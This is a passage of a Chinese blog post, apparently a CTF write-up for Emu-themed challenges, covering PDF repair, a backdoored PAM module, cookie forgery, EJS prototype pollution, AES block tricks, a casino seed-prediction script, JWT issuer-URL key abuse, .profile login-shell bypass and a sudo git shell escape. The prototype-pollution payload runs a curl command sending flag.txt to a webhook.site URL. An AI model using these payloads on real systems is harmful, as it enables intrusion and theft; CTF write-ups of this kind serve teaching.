+<p>这里有个<code>Current</code>很莫名其妙，估计是改这里，再算一下length长度：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205715007.png" alt="image-20240427205715007"></p>
+<p>正好是272个字节，确定是改这里没毛病了。用<code>Notepad++</code>打开PDF进行修改，将第五行内容进行替换：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205814892.png" alt="image-20240427205814892"></p>
+<p>保存后重新打开文件看到flag图片：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205854735.png" alt="image-20240427205854735"></p>
+<p>&#x3D;&#x3D;非预期解法：&#x3D;&#x3D;</p>
+<p>发现<code>jpg</code>文件头：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210020443.png" alt="image-20240427210020443"></p>
+<p>直接将前面所有字节删掉，保存后将文件后缀修改为为<code>jpg</code>打开拿到图片</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210136578.png" alt="image-20240427210136578"></p>
+<h2 id="Emu-in-the-Shell"><a href="#Emu-in-the-Shell" class="headerlink" title="Emu in the Shell"></a>Emu in the Shell</h2><p>使用<code>ssh</code>连接到服务器：</p>
+<pre><code>ssh -p 2022 ir-account@34.87.251.234
+</code></pre>
+<p>根据提示进入<code>/lib/x86_64-linux-gnu/security/</code>目录查看文件修改时间：</p>
+<pre><code>ls -al
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427215222685.png" alt="image-20240427215222685"></p>
+<p>发现<code>pam_unix.so</code>最近有修改记录，最可疑，将该文件下载到本地用<code>IDA</code>分析：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230728660.png" alt="image-20240427230728660"></p>
+<p>看这个长得很像密码的样子，试试用该密码登录<code>emu-haxor</code></p>
+<pre><code>su emu-haxor
+Password: pUpPet_m4sT3r
+</code></pre>
+<p>成功登录，在<code>home/emu-haxor/flag.txt</code>拿到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230941388.png" alt="image-20240427230941388"></p>
+<h2 id="Feathered-Forum-Part-1"><a href="#Feathered-Forum-Part-1" class="headerlink" title="Feathered Forum - Part 1"></a>Feathered Forum - Part 1</h2><p>附件给出页面源代码，想要访问<code>/forum</code>路由需要对<code>auth_required</code>函数进行绕过。对该函数源码进行分析：</p>
+<pre><code class="python">def auth_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        emu_usernames = [account[&quot;username&quot;] for account in EMU_USERS_ACCOUNTS]
+        # Just check that the &quot;username&quot; cookie matches an existing user
+        if not request.cookies.get(&#39;username&#39;, None) in emu_usernames:
+            return redirect(url_for(&#39;index&#39;))
+        return f(*args, **kwargs)
+    return decorated_function
+</code></pre>
+<p>发现只要<code>cookie</code>中的<code>username</code>的值在<code>EMU_USERS_ACCOUNTS</code>即可，这样我们就可以伪造一个cookie进行访问：</p>
+<pre><code>GET /forum
+
+Cookie: username=BeakMaster
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427232027952.png" alt="image-20240427232027952"></p>
+<h2 id="Emu-Apothecary"><a href="#Emu-Apothecary" class="headerlink" title="Emu Apothecary"></a>Emu Apothecary</h2><p>拿到题目源码，已知使用了<code>ejs</code>模板，在<code>index.js</code>进行传参传递给<code>polluteme.js</code>。对<code>polluteme.js</code>中的关键代码进行分析：</p>
+<pre><code class="js">for (const key in userInput) &#123;
+    // Input is in the format of `&#123;ingredientName&#125;.&#123;attribute&#125;`
+    if (!key.includes(&quot;.&quot;)) continue
+    // Split the key name by the &#39;.&#39; character
+    const split = key.split(&#39;.&#39;)
+    // Set the attribute for the ingredient by the first two dots
+    // E.g. if the input is vinegar.type=mL it will set
+    // &#123;&quot;vinegar&quot;: &#123;&quot;type&quot;: &quot;mL&quot;&#125;&#125; in the baseIngredients variable
+    const ingredientName = split[0]
+    if (typeof baseIngredients[ingredientName] === &quot;undefined&quot;) &#123;
+        baseIngredients[ingredientName] = &#123;&#125;
+    &#125;
+    const ingredientAttribute = split[1];
+    // Should be completely secure doing this???
+    // I don&#39;t think the hoomans can pollute anything by assigning attributes this way
+    // Yeah I am pretty sure this is not vulnerable to prototype pollution
+    // I am not merging anything right???
+    baseIngredients[ingredientName][ingredientAttribute] = userInput[key];
+&#125;
+</code></pre>
+<p>虽然代码里没有&#96;&#96;merge<code>或者</code>clone<code>等函数，但</code> baseIngredients[ingredientName][ingredientAttribute] &#x3D; userInput[key];<code>进行了两个数组之间的赋值操作，效果等同于进行了</code>clone&#96;,存在原型链污染。再根据题目描述的传参方式进行构造：</p>
+<pre><code>GET /?__proto__.escapeFunction=JSON.stringify; process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl -F flag=@/flag.txt https://webhook.site/a120d04a-6263-4083-a587-33d4e08a2b6a&#39;)&amp;__proto__.client=true
+</code></pre>
+<p>拿到<code>flag.txt</code>：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085406716.png" alt="image-20240428085406716"></p>
+<p>下载获得<code>flag</code>:</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085508241.png" alt="image-20240428085508241"></p>
+<h2 id="Advanced-Emu-Standard"><a href="#Advanced-Emu-Standard" class="headerlink" title="Advanced Emu Standard"></a>Advanced Emu Standard</h2><p><code>AES-128</code>会将原文16位为一组进行加密，不满16也会当成16位去进行加密，所以我们可以将<code>deactivate_special_procedure_123</code>分为两部分<code>deactivate_speci</code>和<code>al_procedure_123</code>,分别对他们进行加密，然后拼接即为答案：</p>
+<pre><code>deactivate_speci  Encryptor: 3155433d53ed30c89aef89b2e7273924
+al_procedure_123  Encryptor: 4127efafc809cc1209376d039e0001f1
+
+Transmit encrypted command: 3155433d53ed30c89aef89b2e72739244127efafc809cc1209376d039e0001f1
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428084447502.png" alt="image-20240428084447502"></p>
+<h2 id="Emu-Cook-Book"><a href="#Emu-Cook-Book" class="headerlink" title="Emu Cook Book"></a>Emu Cook Book</h2><p>一条龙解密</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428143720534.png" alt="image-20240428143720534"></p>
+<h2 id="Emu-Casino"><a href="#Emu-Casino" class="headerlink" title="Emu Casino"></a>Emu Casino</h2><p>根据给出的<code>py</code>脚本可知，随机数种子与<code>session_id</code>和<code>round</code>有关，而这两个的值都保存在<code>cookie</code>的session字段内。<code>flask</code>的<code>session</code>为三段<code>base64</code>编码的数据组成，利用工具查看发现，第一段数据解码后就包含我们想要的数据：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428103936811.png" alt="image-20240428103936811"></p>
+<p>抓包看数据的发送过程：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104023953.png" alt="image-20240428104023953"></p>
+<p>在<code>/submit-bet</code>路由下发送一个<code>json</code>数据，我们可以在<code>Set-Cookie</code>中获取下一次使用的<code>cookie</code>，由此就可以写出自动化脚本：</p>
+<pre><code class="python">from random import choice, seed
+import base64
+import json
+import requests
+def flip_coin(session_id,round):
+    seed(str(round) + &quot;_&quot; + session_id)
+    return choice([&quot;tails&quot;, &quot;heads&quot;])
+sess=&quot;eyJjcmVkaXRzIjoxMCwicm91bmQiOjEsInNlc3Npb25faWQiOiIyZGE0MDYwMzQyM2JmODViOGJjMDllNGY1YzI5ZGU1ZSJ9.Zi2q9A.3KuBz5eDx7_HylaUEBWxT5RS6nU&quot;
+while True:
+    url=&quot;http://34.87.251.234:3000/submit-bet&quot;
+    cookie=&#123;&quot;session&quot;:sess&#125;
+    seq=cookie[&quot;session&quot;].split(&quot;.&quot;)[0]
+    while len(seq)%4!=0:
+        seq+=&quot;=&quot;
+    jwt=json.loads(base64.urlsafe_b64decode(seq))
+    if jwt[&quot;credits&quot;]&gt;=10000:
+        a=requests.get(&quot;http://34.87.251.234:3000/&quot;,cookies=cookie)
+        print(a.text)
+        break
+    a=requests.post(url,cookies=cookie,json=&#123;&quot;bet_amount&quot;:jwt[&#39;credits&#39;],&quot;bet_choice&quot;:flip_coin(jwt[&quot;session_id&quot;],jwt[&#39;round&#39;])&#125;)
+    print(a.text)
+    sess=a.headers[&#39;set-Cookie&#39;].split(&quot;;&quot;)[0].replace(&quot;session=&quot;,&#39;&#39;)
+    print(sess)
+</code></pre>
+<p>最后拿到flag：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104245922.png" alt="image-20240428104245922"></p>
+<h2 id="EWT"><a href="#EWT" class="headerlink" title="EWT"></a>EWT</h2><p>拿到源码后进行分析，发现关键函数：</p>
+<pre><code class="js">async function validateJwt(jwtToken) &#123;
+    // We want to allow Emus to use both HS256 and RS256 signing algos
+    const decodedJwt = jwt.decode(jwtToken, &#123;complete: true&#125;);
+    if ( !decodedJwt ) &#123;
+        throw Error(&quot;where JWT at??&quot;)
+    &#125;
+    const decodedHeader = decodedJwt.header, decodedBody = decodedJwt.payload;
+    const signingAlgo = decodedHeader.alg;
+
+    // We only allow HS256 or RS256 signing algos
+    if (![&quot;HS256&quot;, &quot;RS256&quot;].includes(signingAlgo)) &#123;
+        throw Error(&quot;invalid algorithm in JWT&quot;);
+    &#125;
+
+    key = SECRET_KEY;
+
+    if (signingAlgo === &quot;RS256&quot;) &#123;
+        // Grab where the RS256 public key URL from the &quot;iss&quot; claim in the JWT body
+        // We currently haven&#39;t figured out how to sign our own RS256 JWTs yet...
+        const issuerUrl = decodedBody.iss;
+
+        // Make sure those hoomans aren&#39;t hacking with something like file://
+        const regExp = new RegExp(&quot;^https?://&quot;);
+        if (!regExp.test(issuerUrl)) &#123;
+            throw Error(&quot;invalid URL in iss claim&quot;);
+        &#125;
+        
+        // Should be fine to download the public key
+        key = await downloadFromUrl(issuerUrl);
+    &#125;
+
+    // Verify the JWT token
+    return jwt.verify(jwtToken, key);
+&#125;
+</code></pre>
+<p>要求加密算法必须为<code>RS256</code>或者<code>HS256</code>,而这里提供了若为<code>RS256</code>算法，可从url远程下载<code>public key</code>的方式，我们就可以根据该种方式生成<code>token</code>拿到flag。在<a target="_blank" rel="noopener" href="https://jwt.io/%E8%BF%9B%E8%A1%8C%E6%9E%84%E9%80%A0%EF%BC%9A">https://jwt.io/进行构造：</a></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142339778.png" alt="image-20240428142339778"></p>
+<p>将<code>public key</code>存储在服务器web目录下的<code>	key</code>文件内，<code>iss</code>的值为其地址，因为不太会用<code>pastbin</code>的纯文本分享我就丢自己的服务器上了。将生成的<code>token</code>拿去提交成功拿到<code>flag</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142823544.png" alt="image-20240428142823544"></p>
+<h2 id="Emu-Hack-2-Git-Gud"><a href="#Emu-Hack-2-Git-Gud" class="headerlink" title="Emu Hack #2 - Git Gud"></a>Emu Hack #2 - Git Gud</h2><p>题目提示说在8000端口下有一个git仓库名为<code>emu</code>,使用<code>git clone</code>命令下载查看：</p>
+<pre><code>git clone http://34.116.68.59:8000/emu
+</code></pre>
+<p><img src="C:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145356203.png" alt="image-20240514145356203"></p>
+<p>在<code>README.txt</code>中拿到flag</p>
+<p><img src="C:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145439171.png" alt="image-20240514145439171"></p>
+<pre><code>UWA&#123;N()w_y0U_kN0W_40w_2_u53_g17!1!!&#125;
+</code></pre>
+<h2 id="Emu-Hack-3-SSH-Tricks"><a href="#Emu-Hack-3-SSH-Tricks" class="headerlink" title="Emu Hack #3 - SSH Tricks"></a>Emu Hack #3 - SSH Tricks</h2><p>题目说设置了<code>.profile</code>文件限制了登录，我们利用<code>scp</code>协议看一下<code>.profile</code>文件的内容</p>
+<pre><code>scp -P 2022 emu001@34.116.68.59:.profile ./example.txt
+</code></pre>
+<pre><code class="bash">#!/bin/bash
+clear;
+echo &#39;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠&#39;;
+echo &#39;⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⠖⠚⠛⠉⠉⠉⠉⠉⠉⠉⠛⠓⠲⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘&#39;;
+echo &#39;⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⡄⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈&#39;;
+echo &#39;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰&#39;;
+echo &#39;⠂⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀&#39;;
+echo &#39;⡄⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⣷⣿⠀⠀⢀⣤⡴⣦⣤⣄⠀⠀⣰⣿⣙⡆⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⠂⠀⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠋⠀⠀⣿⢳⡜⡰⢢⡘⡇⠀⠹⠿⠿⠃⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⢀⡴⢣⠌⡑⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣩⢛⣥⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⠀⠀⠀⠁⠀⠀⠀⠀⠀⢠⡿⣐⢃⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⡀⠀⠀⠀⠀⠀⠀⠀⢠&#39;;
+echo &#39;⠀⠀⠀⠀⠀⠀⠀⠀⢀⡏⠰⢌⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⠀⠀⠀⠀⠀⠀⠀⠀⣾⠠⡙⢄⠃⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠐&#39;;
+echo &#39;⠁⠀⠀⠀⠀⠀⠀⠀⡇⢠⠑⡌⢢⠁⡄⠠⣁⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠈⣷⠀⠀⠀⠀⠀⠀⢀&#39;;
+echo &#39;⠄⠀⠀⠀⠀⠀⠀⢸⡇⢀⠊⠤⢁⠊⠄⡡⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢸⡀⠀⣿⠀⠀⠀⠀⠀⠀⠈&#39;;
+echo &#39;⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⡈⠐⡈⠐⠠⢠⡏⠀⠄⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠐⢀⢸⡇⢰⡟⠀⠀⠀⠀⠀⠀⠰&#39;;
+echo &#39;⠁⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⣠⡿⢀⠡⠈⠄⠂⡁⠐⡀⠠⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠠⠀⠂⢈⠀⠄⠂⠄⢸⡇⣼⠁⠀⠀⠀⠀⠀⠀⢀&#39;;
+echo &#39;⠄⠀⠀⠀⠀⠀⠀⠀⠘⣷⢾⡾⠷⢺⡟⡀⠂⠄⡁⢂⠡⢀⠡⢀⠂⠌⢀⠐⢈⠀⠡⢀⠁⠂⡁⢀⠂⠁⠄⡁⠂⠌⠠⠁⠌⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣾⡆⢠⡟⠠⢀⠁⢂⠐⡀⠂⠄⠂⠄⡈⠐⠠⠈⠄⡈⠐⠠⢈⠐⡀⠂⠌⡐⠠⢀⠡⠈⠄⠡⠈⣾⡾⠀⠀⠀⠀⠀⠀⠀⠀⠰&#39;;
+echo &#39;⠂⠀⠀⠂⠀⠀⠀⠀⠀⠀⠙⢲⡟⠀⡁⠂⠌⡀⠂⠄⠡⢈⠐⠠⢀⠡⢂⠁⠂⠄⡁⠂⠄⠂⠄⡁⠂⠄⡁⠂⠄⠡⠈⠄⣹⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀&#39;;
+echo &#39;⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⡁⠂⠄⠡⢈⠐⠠⢈⠐⡀⠂⠄⡈⠐⠠⢀⠡⢈⠐⠠⢀⠁⠂⠄⠡⠈⠄⡁⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈&#39;;
+echo &#39;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠡⢈⠐⠠⢈⠐⡀⠂⠄⡁⠂⠄⡁⠂⠄⠂⠄⡈⠐⠠⢈⠐⡈⠄⠁⢢⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰&#39;;
+echo &#39;⠀⠀⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣤⡈⢐⣤⣦⣤⣡⣦⣄⠁⠂⠄⠡⢈⠐⠠⢀⣁⣦⣄⣦⡴⢤⡞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⡀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⢣⢗⣸⡿⡴⣩⣿⣀⣈⣀⣤⣬⣤⣟⢯⣑⢮⡿⡜⣧⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈&#39;;
+echo &#39;⠁⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡜⠷⢾⠿⢧⡷⠟⡉⢿⡟⢩⠙⠤⠉⢻⡷⠾⠟⠳⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠&#39;;
+echo &#39;⠄⠀⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡀⠀⡀⠄⠀⠄⢀⢹⡄⠀⠄⠂⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⡀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠄⠐⠈⠀⠄⢸⠄⠂⠠⠈⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘&#39;;
+echo &#39;⠁⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠂⠁⠈⡀⢸⠀⠄⠁⢀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠&#39;;
+echo &#39;⠄⠀⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢧⡀⠈⢀⠀⢸⡇⠀⠂⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠠⣇⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘&#39;;
+echo &#39;⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠷⣄⠀⣿⢦⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀&#39;;
+echo &#39;⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠷⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀&#39;;
+echo &#39;⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐&#39;;
+echo &#39;&#39;;
+echo &#39;wot are you doing here m8? this is for emus and birbs only!&#39;;
+exit 0;
+</code></pre>
+<p>直接<code>exit 0</code>退出了，再试试能不能直接下载<code>/home/emu001</code>文件夹里面的文件：</p>
+<pre><code>scp -P 2022 emu001@34.116.68.59:/home/emu001/* ./ctf
+</code></pre>
+<p><img src="C:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514151957982.png" alt="image-20240514151957982"></p>
+<p>成功下载到两个文件，flag在图片里：</p>
+<p><img src="C:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514152042484.png" alt="image-20240514152042484"></p>
+<pre><code>UWA&#123;how_did_u_get_past_that_login_shell?????&#125;
+</code></pre>
+<p>还有一个办法，可以这样登录：</p>
+<pre><code>ssh -p 2022 -t emu001@34.116.68.59 /bin/bash
+ssh -p 2022 emu001@34.116.68.59 &quot;bash --noprofile --norc&quot;
+</code></pre>
+<p>这样就不会执行<code>.profile</code>文件了</p>
+<h2 id="Emu-Hack-4-Git-Gud-or-GTFO-Bin"><a href="#Emu-Hack-4-Git-Gud-or-GTFO-Bin" class="headerlink" title="Emu Hack #4 - Git Gud or GTFO Bin"></a>Emu Hack #4 - Git Gud or GTFO Bin</h2><p>利用上面两个方法实现绕过登录，看题目意思应该是<code>git</code>提权</p>
+<p>先用<code>sudo -l</code>查看一下权限，确实可以通过<code>git</code>实现切换成<code>mr_x</code>用户</p>
+<p><img src="C:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514171059762.png" alt="image-20240514171059762"></p>
+<p>键入命令</p>
+<pre><code>sudo -u mr_x git -p help
+</code></pre>
+<p>输入密码后，在冒号后输入：</p>
+<pre><code>!/bin/bash
+</code></pre>
+<p>成功进入<code>mr_x</code>用户界面，读取flag</p>
+<p><img src="C:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514173309181.png" alt="image-20240514173309181"></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81ODIyMS8zNDY4NA==">
+        <script type="text/javascript">
+			(function(d, s) {
+				var j, e = d.getElementsByTagName(s)[0];
+
+				if (typeof LivereTower === 'function') { return; }
+
+				j = d.createElement(s);
+				window.livereOptions = {
+					eagerLoading: true,
+					scrollEventTargetSelector: '#post'
+                }
+				j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+				j.async = true;
+				e.parentNode.insertBefore(j, e);
+			})(document, 'script');
+        </script>
+        <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023 ttycp3
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+    
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+    
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+    
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+    
+        
+        
+    }
+    
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
